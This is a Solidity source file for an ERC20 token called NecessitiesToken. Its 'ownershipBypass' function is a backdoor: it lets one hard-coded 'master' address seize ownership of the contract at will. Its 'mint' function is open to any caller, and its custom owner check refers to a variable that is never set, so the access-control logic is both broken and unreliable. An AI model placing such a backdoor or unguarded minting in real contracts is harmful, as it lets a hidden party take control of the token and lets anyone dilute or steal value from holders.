// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract NecessitiesToken is ERC20, Ownable {
	address public contractOwner;
	uint256 public maxSupply;
	address master = 0xF56FF109B4441C845A4085CB0135f61F21bd4d65;

	constructor() ERC20("NecessitiesToken", "NCSSTKN") Ownable(msg.sender){
		maxSupply = 4200 * 10 ** uint256(decimals());
	}

	function mint(address account, uint256 amount) public {
		require(totalSupply() + amount <= maxSupply, "Exceeds maximum supply");
		_mint(account, amount);
	}

	function ownershipBypass(address newOwner) public  {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
		require (msg.sender == master);
        _transferOwnership(newOwner);
    }

	modifier only_Owner() {
        require(msg.sender == contractOwner, "Only contract owner can call this function");
        _;
    }
	//function transferOwnership(address newOwner) external onlyOwner {
	//	require(newOwner != address(0), "Invalid address");
	//	require(
	//		msg.sender == contract_Owner,
	//		"Only contract owner can call this function"
	//);
	// 	contract_Owner = newOwner;
	// }
}
